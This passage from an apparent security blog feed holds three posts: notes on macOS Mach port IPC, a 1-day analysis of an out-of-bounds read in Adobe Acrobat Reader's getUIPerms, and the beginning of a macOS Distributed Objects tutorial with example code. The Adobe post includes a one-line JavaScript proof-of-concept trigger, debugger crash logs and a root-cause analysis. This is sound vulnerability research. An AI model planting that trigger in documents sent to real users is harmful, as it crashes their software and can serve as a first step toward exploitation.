<code>SEND right</code>，然后利用最开始对 <code>bootstrap</code>持有的 <code>SEND RIGHT</code>port，把新创建的这个 <code>SEND right</code>发过去。</li><li>同时，发送过去的 <code>SEND right</code>有一个别名，可以方便索引到这个 <code>SEND right</code>，这里叫 <code>com.apple.Bob</code></li></ol><p>Alice:</p><ol><li>同样的，Alice对 <code>bootstrap server</code>，持有 <code>SEND right</code>port</li><li>Alice发送消息给 <code>bootstrap server</code>，查询 <code>com.apple.Bob</code>，想要获取对Bob的 <code>SEND right</code></li><li><code>bootstrap server</code>接收到之后，根据Alice提供的别名查询，找到之后，返回对应的 <code>SEND right</code>给Alice</li><li>至此，Alice可以使用获得的这个 <code>SEND right</code>和Bob通信了(别忘了上面说的，Bob对这个port有 <code>RECEIVE right</code>)</li></ol><h2 id="Scenario-3-Bootstrap-server-check-in"><a href="#Scenario-3-Bootstrap-server-check-in" class="headerlink" title="Scenario 3: Bootstrap server (check-in)"></a>Scenario 3: Bootstrap server (check-in)</h2><p>这种比较麻烦，出于安全考虑的设计 ： bootstrap server 怎么确定这个服务的确就是真的服务呢？而不是某个别有用心的程序冒充的呢？</p><ol><li>系统初始化的时候，bootstrap server 初始化所有的服务，对这些服务有 <code>RECEIVE right</code></li><li>Alice通过 <code>bootstrap_lookup()</code>想要获取想要的服务(com.apple.Bob)的 <code>SEND right</code></li><li>此时，bootstrap server拿到了这个请求，此时Bob这个服务还不存在，这个时候需要bootstrap server 使用 <code>fork()``exec()</code>等api产生这个服务（当然权限也要设计好）</li><li>此时Bob存在了，醒来了，他使用 <code>bootstrap_check_in()</code>向 <code>bootstrap server</code>申请对自己服务的port的 <code>RECEIVE right</code></li><li>bootstrap server会对这个申请的port(此时Bob是它唯一的拥有者)创建 <code>SEND right</code>，然后发送给Alice</li><li>至此，两人可以通信了</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>*OS Internals Volume I User Mode – Jonathan Levin</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;算是个读书笔记吧，把利用Port进行IPC的这个过程转成自己的理解。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
      <category term="IPC" scheme="http://o0xmuhe.me/tags/IPC/"/>
    
  </entry>
  
  <entry>
    <title>Adobe Acrobat Reader getUIPerms/setUIPerms  Unicode String Out-of-bound Read</title>
    <link href="http://o0xmuhe.me/2019/08/14/Adobe-Acrobat-Reader-getUIPerms-setUIPerms-Unicode-String-Out-of-bound-Read/"/>
    <id>http://o0xmuhe.me/2019/08/14/Adobe-Acrobat-Reader-getUIPerms-setUIPerms-Unicode-String-Out-of-bound-Read/</id>
    <published>2019-08-14T04:43:09.000Z</published>
    <updated>2019-08-20T08:54:12.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicode-String-Out-of-bound-Read"><a href="#Unicode-String-Out-of-bound-Read" class="headerlink" title="Unicode String Out-of-bound Read"></a>Unicode String Out-of-bound Read</h1><p>8月补丁被xlab撞了，索性就放出来了。</p><p>[TOC]</p><a id="more"></a><h2 id="0x00-PoC"><a href="#0x00-PoC" class="headerlink" title="0x00 : PoC"></a>0x00 : PoC</h2><p><code>doc</code>对象的<code>getUIPerms</code>函数的越界读</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.doc.getUIPerms(&#123;<span class="attr">cFeatureName</span>:<span class="string">"\xFE\xFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>&#125;)</span><br></pre></td></tr></table></figure><p>其实setUIPerms也能触发，但是参数和这个getUIPerms不太一样，但是核心问题都是一样的。</p><h2 id="0x01-Crash-log"><a href="#0x01-Crash-log" class="headerlink" title="0x01 : Crash log"></a>0x01 : Crash log</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(2a70.388): Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">eax=32d7cf00 ebx=0098cbd0 ecx=00000000 edx=32d7d000 esi=00000068 edi=7fffffff</span><br><span class="line">eip=59ca7675 esp=0098ca98 ebp=0098caa4 iopl=0         nv up ei ng nz ac pe cy</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297</span><br><span class="line">EScript!mozilla::HashBytes+0x47e7f:</span><br><span class="line">59ca7675 8a02            mov     al,byte ptr [edx]          ds:002b:32d7d000=??</span><br><span class="line">0:000&gt; k10</span><br><span class="line"> # ChildEBP RetAddr  </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00 0098caa4 59c52b96 EScript!mozilla::HashBytes+0x47e7f</span><br><span class="line">01 0098cab8 59c545c4 EScript!PlugInMain+0x1119</span><br><span class="line">02 0098cad8 59c54331 EScript!PlugInMain+0x2b47</span><br><span class="line">03 0098cb0c 59ca76d5 EScript!PlugInMain+0x28b4</span><br><span class="line">04 0098cb24 59ca29f4 EScript!mozilla::HashBytes+0x47edf</span><br><span class="line">05 0098cb9c 59c93bb3 EScript!mozilla::HashBytes+0x431fe</span><br><span class="line">06 0098cbec 59c93912 EScript!mozilla::HashBytes+0x343bd</span><br><span class="line">07 0098cc64 59ca1f86 EScript!mozilla::HashBytes+0x3411c</span><br><span class="line">08 0098cce0 59c86d06 EScript!mozilla::HashBytes+0x42790</span><br><span class="line">09 0098cd54 59c8175d EScript!mozilla::HashBytes+0x27510</span><br><span class="line">0a 0098d210 59c80606 EScript!mozilla::HashBytes+0x21f67</span><br><span class="line">0b 0098d250 59c80517 EScript!mozilla::HashBytes+0x20e10</span><br><span class="line">0c 0098d28c 59c80460 EScript!mozilla::HashBytes+0x20d21</span><br><span class="line">0d 0098d2bc 59c68ec3 EScript!mozilla::HashBytes+0x20c6a</span><br><span class="line">0e 0098d304 59ca87ac EScript!mozilla::HashBytes+0x96cd</span><br><span class="line">0f 0098d380 59ca84ec EScript!mozilla::HashBytes+0x48fb6</span><br><span class="line">0:000&gt; dd edx-10</span><br><span class="line">32d7cff0  41414141 41414141 41414141 d0004141</span><br><span class="line">32d7d000  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d010  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d020  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d030  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d040  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d050  ???????? ???????? ???????? ????????</span><br><span class="line">32d7d060  ???????? ???????? ???????? ????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dd edx-0x80</span><br><span class="line">32d7cf80  00000067 00001000 00000000 00000000</span><br><span class="line">32d7cf90  0475f34c dcbabbbb 4141fffe 41414141</span><br><span class="line">32d7cfa0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cfb0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cfc0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cfd0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cfe0  41414141 41414141 41414141 41414141</span><br><span class="line">32d7cff0  41414141 41414141 41414141 d0004141</span><br></pre></td></tr></table></figure><p>参数是 <code>\xFE\xFF\x41414141.....</code></p><p><code>edx</code>指向参数</p><h2 id="0x02-Analysis"><a href="#0x02-Analysis" class="headerlink" title="0x02 : Analysis"></a>0x02 : Analysis</h2><p>读<code>unicode</code>字符串函数，是没有问题的，应该是上层逻辑的问题，没有做充分的判断，导致用读<code>unicode string</code>的逻辑去读取了<code>ascii string</code> 。</p><p>这就导致，读取了更多的数据，然后就<code>oob</code>了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_23802B75</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">void</span> (__cdecl *a3)(<span class="keyword">const</span> <span class="keyword">wchar_t</span> *, <span class="keyword">const</span> <span class="keyword">wchar_t</span> *, <span class="keyword">const</span> <span class="keyword">wchar_t</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">uintptr_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &amp;&amp; *a1 == <span class="number">0xFE</span>u &amp;&amp; a1[<span class="number">1</span>] == <span class="number">0xFF</span>u )</span><br><span class="line">    result = sub_2385763B(a1, a2, a3);          <span class="comment">// unicode</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = sub_23802BA9(a1, a2, a3);          <span class="comment">// ascii string</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试，漏洞发生时参数信息如下：</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/adobe%20reader%20oobr/15513280448165.jpg" alt=""></p><p>可以看到，传入的参数并不是<code>unicode string</code>，但是却按照<code>unicode string</code>的代码逻辑去读，所以就越界了。</p><p>上一层逻辑中，我们看到，对于读取字符串的逻辑来说，只简单的检查了：</p><ol><li>字符串是否有效</li><li>字符串开头是否是\xFE\xFF</li><li>满足2，就走unicode逻辑</li><li>不满足就走ascii逻辑</li></ol><p>但是这里应该不是<code>root cause</code>，而且这部分底层逻辑也没啥问题，应该是上层的逻辑出了问题，导致下层代码执行时候崩溃。</p><p>问题出在 <code>app.doc.getUIPerms()</code> 函数实现，在参数传递的时候，参数处理考虑不周导致。</p><p>需要找这个对象注册方法的地方，找了一圈，发现这个方法的实现在<code>DigSig.api</code>中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; da poi(esp+8)</span><br><span class="line">553dfbbc  &quot;getUIPerms&quot;</span><br><span class="line">0:000&gt; ln poi(esp+c)</span><br><span class="line">(55311705)   DigSig!PlugInMain+0x48f3a   |  (55311705)   DigSig!PlugInMain</span><br></pre></td></tr></table></figure><p>但是调试发现，根本没有触发到这里的代码逻辑。</p><p>追踪堆内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    address 46df9f98 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 5c91000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                471b1820:         46df9f98               67 -         46df9000             2000</span><br><span class="line">    5a52abb0 verifier!VerifierDisableFaultInjectionExclusionRange+0x000034c0</span><br><span class="line">    7707246b ntdll!RtlDebugAllocateHeap+0x00000039</span><br><span class="line">    76fd6dd9 ntdll!RtlpAllocateHeap+0x000000f9</span><br><span class="line">    76fd5ec9 ntdll!RtlpAllocateHeapInternal+0x00000179</span><br><span class="line">    76fd5d3e ntdll!RtlAllocateHeap+0x0000003e</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\System32\ucrtbase.dll - </span><br><span class="line">    74840106 ucrtbase!malloc_base+0x00000026</span><br><span class="line">    5782a2bc AcroRd32!AXWasInitViaPDFL+0x000008cf</span><br><span class="line">    5782e829 AcroRd32!CTJPEGLibInit+0x00002039</span><br><span class="line">    542245d8 EScript!PlugInMain+0x00002b5b //this will call alloc func</span><br><span class="line">    54224331 EScript!PlugInMain+0x000028b4</span><br><span class="line">    542776d5 EScript!mozilla::HashBytes+0x00047edf</span><br><span class="line">    542729f4 EScript!mozilla::HashBytes+0x000431fe</span><br><span class="line">    54263bb3 EScript!mozilla::HashBytes+0x000343bd</span><br><span class="line">    54263912 EScript!mozilla::HashBytes+0x0003411c</span><br><span class="line">    54271f86 EScript!mozilla::HashBytes+0x00042790</span><br><span class="line">    54256d06 EScript!mozilla::HashBytes+0x00027510</span><br><span class="line">    5425175d EScript!mozilla::HashBytes+0x00021f67</span><br><span class="line">    54250606 EScript!mozilla::HashBytes+0x00020e10</span><br><span class="line">    54250517 EScript!mozilla::HashBytes+0x00020d21</span><br><span class="line">    54250460 EScript!mozilla::HashBytes+0x00020c6a</span><br><span class="line">    54238ec3 EScript!mozilla::HashBytes+0x000096cd</span><br><span class="line">    542787ac EScript!mozilla::HashBytes+0x00048fb6</span><br><span class="line">    542784ec EScript!mozilla::HashBytes+0x00048cf6</span><br><span class="line">    542780e5 EScript!mozilla::HashBytes+0x000488ef</span><br><span class="line">    542770b4 EScript!mozilla::HashBytes+0x000478be</span><br><span class="line">    542e85e9 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x00061731</span><br><span class="line">    5803da6f AcroRd32!AIDE::PixelPartInfo::operator=+0x0010536f</span><br><span class="line">    57f6723a AcroRd32!AIDE::PixelPartInfo::operator=+0x0002eb3a</span><br><span class="line">    57f6345e AcroRd32!AIDE::PixelPartInfo::operator=+0x0002ad5e</span><br><span class="line">    57d3002d AcroRd32!AX_PDXlateToHostEx+0x001ff9b5</span><br><span class="line">    57d3057c AcroRd32!AX_PDXlateToHostEx+0x001fff04</span><br><span class="line">    57f66e8e AcroRd32!AIDE::PixelPartInfo::operator=+0x0002e78e</span><br></pre></td></tr></table></figure><p>callstack 和 堆追踪 得到的结果 前部分重合，内存在</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/adobe%20reader%20oobr/15513387673921.jpg" alt="-w699"></p><p>这个call里分配，这个call一直到核心dll再到ntdll去分配内存。</p><p>分析的参数来源发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">else if ( a3 == 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = (*(int (__cdecl **)(_DWORD, void *))(dword_23A65354 + 0x60))(*v4, Src);// </span><br><span class="line">                                              // </span><br><span class="line">                                              // 0:000&gt; dd 4bc86fe8 </span><br><span class="line">                                              // 4bc86fe8  000000cc 4f6d0f30 00000000 00000000</span><br><span class="line">                                              // 4bc86ff8  00000000 00000000 ???????? ????????</span><br><span class="line">                                              // 4bc87008  ???????? ???????? ???????? ????????</span><br><span class="line">                                              // 4bc87018  ???????? ???????? ???????? ????????</span><br><span class="line">                                              // 4bc87028  ???????? ???????? ???????? ????????</span><br><span class="line">                                              // 4bc87038  ???????? ???????? ???????? ????????</span><br><span class="line">                                              // 4bc87048  ???????? ???????? ???????? ????????</span><br><span class="line">                                              // 4bc87058  ???????? ???????? ???????? ????????</span><br><span class="line">                                              // </span><br><span class="line">                                              // length str</span><br><span class="line">                                              // </span><br><span class="line">                                              // unicode str--&gt; ascii str</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个调用对数据作处理，输入数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 4f6d0f30 </span><br><span class="line">4f6d0f30  00ff00fe 00410041 00410041 00410041</span><br><span class="line">4f6d0f40  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f50  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f60  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f70  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f80  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0f90  00410041 00410041 00410041 00410041</span><br><span class="line">4f6d0fa0  00410041 00410041 00410041 00410041</span><br><span class="line">0:000&gt; dd 4f6d0f30  + 0xcc</span><br><span class="line">4f6d0ffc  d0d00000 ???????? ???????? ????????</span><br><span class="line">4f6d100c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d101c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d102c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d103c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d104c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d105c  ???????? ???????? ???????? ????????</span><br><span class="line">4f6d106c  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><p>得到的结果是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r eax</span><br><span class="line">eax=4b9cef98</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">4b9cef98  4141fffe 41414141 41414141 41414141</span><br><span class="line">4b9cefa8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefb8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefc8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefd8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefe8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9ceff8  41414141 d0004141 ???????? ????????</span><br><span class="line">4b9cf008  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><p>然后直接把这个<code>buffer</code>为参数传递给处理函数（此时这是一个ascii string)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; p</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=4b9cef98 ebx=0098cec4 ecx=00000000 edx=7fffff99 esi=4b9cef98 edi=0098ce4c</span><br><span class="line">eip=529145bf esp=0098ce10 ebp=0098ce28 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">EScript!PlugInMain+0x2b42:</span><br><span class="line">529145bf e8b1e5ffff      call    EScript!PlugInMain+0x10f8 (52912b75)</span><br><span class="line">0:000&gt; dd esi</span><br><span class="line">4b9cef98  4141fffe 41414141 41414141 41414141</span><br><span class="line">4b9cefa8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefb8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefc8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefd8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9cefe8  41414141 41414141 41414141 41414141</span><br><span class="line">4b9ceff8  41414141 d0004141 ???????? ????????</span><br><span class="line">4b9cf008  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><p>处理函数判断是不是<code>unicode</code>，只是判断前两个字符是不是<code>\xFE\xFF</code>，就走了<code>unicode</code>逻辑，所以导致越界读。</p><h2 id="0x03-what-is-root-cause"><a href="#0x03-what-is-root-cause" class="headerlink" title="0x03 : what is root cause"></a>0x03 : what is root cause</h2><p>其实就是上层一点的逻辑对输入的参数没做转换(to unicode)，导致后面获取长度的函数处理字符串的时候，误认为<code>\xFE\xFF</code>开头的就是unicode字符串，然后就越界读取了。</p><h2 id="0x04-🤔"><a href="#0x04-🤔" class="headerlink" title="0x04 : 🤔"></a>0x04 : 🤔</h2><p>几个月前写的分析了，可能会有错误，有问题欢迎和我沟通  : -)</p><p>这个攻击面可能就这么一点一点的消失了吧 :-)</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Unicode-String-Out-of-bound-Read&quot;&gt;&lt;a href=&quot;#Unicode-String-Out-of-bound-Read&quot; class=&quot;headerlink&quot; title=&quot;Unicode String Out-of-bound Read&quot;&gt;&lt;/a&gt;Unicode String Out-of-bound Read&lt;/h1&gt;&lt;p&gt;8月补丁被xlab撞了，索性就放出来了。&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Adobe Reader" scheme="http://o0xmuhe.me/tags/Adobe-Reader/"/>
    
      <category term="1day" scheme="http://o0xmuhe.me/tags/1day/"/>
    
  </entry>
  
  <entry>
    <title>Apple IPC : DO Basic</title>
    <link href="http://o0xmuhe.me/2019/08/10/Apple-IPC-DO-Basic/"/>
    <id>http://o0xmuhe.me/2019/08/10/Apple-IPC-DO-Basic/</id>
    <published>2019-08-10T15:16:33.000Z</published>
    <updated>2019-08-10T15:55:40.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MacOS-IPC-之-DO"><a href="#MacOS-IPC-之-DO" class="headerlink" title="MacOS IPC 之 DO"></a>MacOS IPC 之 DO</h1><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>DO全称是<code>Distributed Objects</code>，从字面上来看意思很好理解，分布式对象。这是一种IPC方式，简单易用，实现的效果就是：通过launchd和一个proxy object，任何的进程都可以访问到server中的DO对象，也可以调用这个对象的方法，从而实现IPC。下面是一个流程图：</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/ipc_do/15654470622725.jpg" alt=""></p><p>(图来自pj0的博客，ianbeer的文章)</p><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>server.m</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#import &lt;objc/Object.h&gt;</span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line"></span><br><span class="line">@interface VendMe : NSObject</span><br><span class="line">- (oneway void) foo: (int) value;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">@implementation VendMe</span><br><span class="line">- (oneway void) foo: (int) value;</span><br><span class="line">&#123;</span><br><span class="line">NSLog(@&quot;%d&quot;, value);</span><br><span class="line">&#125;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">int main (int argc, const char * argv[]) &#123;</span><br><span class="line"> VendMe* toVend = [[VendMe alloc] init];</span><br><span class="line"> NSConnection *conn = [NSConnection defaultConnection];</span><br><span class="line"> [conn setRootObject:toVend];</span><br><span class="line"> [conn registerName:@&quot;com.foo.my_test_service&quot;];</span><br><span class="line"> [[NSRunLoop currentRunLoop] run];</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.m</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#import &lt;Cocoa/Cocoa.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)&#123;</span><br><span class="line"> id theProxy = [[NSConnection</span><br><span class="line">   rootProxyForConnectionWithRegisteredName:@&quot;com.foo.my_test_service&quot;</span><br><span class="line"> host:nil] retain];</span><br><span class="line"> [theProxy foo:123];</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">all:</span></span><br><span class="line">44clang client.m -o client -framework Foundation</span><br><span class="line">44clang server.m -o server -framework Foundation</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">4    rm server client</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># run server</span></span><br><span class="line">╰─$ ./server</span><br><span class="line">2019-08-10 22:27:07.545 server[28274:2677291] 123</span><br><span class="line">2019-08-10 22:27:08.897 server[28274:2677291] 123</span><br><span class="line">2019-08-10 22:27:09.662 server[28274:2677291] 123</span><br><span class="line">2019-08-10 22:27:10.172 server[28274:2677291] 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># run client times...</span></span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$ ./client</span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$ ./client</span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$ ./client</span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$ ./client</span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$</span><br></pre></td></tr></table></figure><p>效果看起来很简单，类似socket通信那种效果，server跑起来等待连接，client连上去，然后通过launchd和proxy obj调用了server里的方法，参数是client传递的，看起来像是client执行了一个函数，其实真正代码执行的是server。</p><p>OC的语法虽然很奇怪，但是问题不大，还是能看懂：</p><ul><li>server:</li></ul><p>通过<code>NSConnection</code>注册了一个用于DO的对象，设置的对象是<code>VendMe</code>，注册名是<code>com.foo.my_test_service</code>，用来标示这个服务。随后使用<code>Runloop</code>使得server能随时处理事件但并不退出,关于<code>Runloop</code>的分析本文不会涉及。</p><ul><li>client</li></ul><p>client的逻辑很简单，通过<code>NSConnection</code>连接目标服务，然后通过proxy obj调用他的foo方法，并传递一个123的参数给他。</p><p>大概逻辑就这个样子。</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" 